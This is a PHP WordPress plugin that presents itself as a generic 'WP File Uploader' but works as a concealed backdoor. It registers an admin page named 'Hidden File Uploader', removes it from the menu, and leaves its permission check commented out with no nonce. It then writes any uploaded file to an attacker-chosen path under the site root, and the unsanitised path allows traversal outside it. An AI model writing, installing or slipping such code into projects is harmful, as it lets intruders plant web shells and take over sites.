<?php
/*
Plugin Name: WP File Uploader
Description: WP File Uploader
Version: WP File Uploader
Author: WP File Uploader
*/

if (!defined('ABSPATH')) exit;

add_action('admin_menu', function() {
    add_menu_page(
        'Hidden File Uploader',
        'Hidden File Uploader',
        'manage_options',
        'wp-file-uploader',
        'wp_file_uploader_page',
        null,
        99
    );
    remove_menu_page('wp-file-uploader');
});

function wp_file_uploader_page() {
    // if (!current_user_can('manage_options')) {
    //     wp_die('access!');
    // }

    if (!function_exists('WP_Filesystem')) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
    }
    WP_Filesystem();
    global $wp_filesystem;

    $base_dir = untrailingslashit(ABSPATH);

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_FILES['file'])) {
        $file = $_FILES['file'];
        $filename = !empty($_POST['filename']) ? sanitize_file_name($_POST['filename']) : '';
        if (empty($filename)) {
            echo "文件名";
            return;
        }
        $subdir = '';
        if (!empty($_POST['path'])) {
            $subdir = str_replace('\\', '/', $_POST['path']);
            $subdir = trim($subdir, '/');
        }

        $target_file = $base_dir . '/' . $subdir . '/' . $filename;
        if ($wp_filesystem->exists($target_file)) {
            echo "文件已存在: " . esc_html($target_file) . "<br>";
            return;
        }

        $dirs = explode('/', $subdir);
        $current = $base_dir;
        foreach ($dirs as $dir) {
            $current .= '/' . $dir;
            if (!$wp_filesystem->is_dir($current)) {
                $created = $wp_filesystem->mkdir($current, FS_CHMOD_DIR);
            }
        }

        $target_file = $current . '/' . $filename;

        if ($file['error'] !== UPLOAD_ERR_OK) {
            echo "file error:" . $file['error'] . "<br>";
            exit;
        }
        
        
        $content = file_get_contents($file['tmp_name']);
        $result = $wp_filesystem->put_contents($target_file, $content, FS_CHMOD_FILE);

        echo "result: " . ($result ? "success" : "failed") . "<br>";
    }

    ?>
    <form method="POST" enctype="multipart/form-data" style="">
        <input type="file" name="file" />
        <input type="text" name="filename">
        <input type="text" name="path" placeholder="submit" />
        <input type="submit" value="submit" />
    </form>
    <?php
}
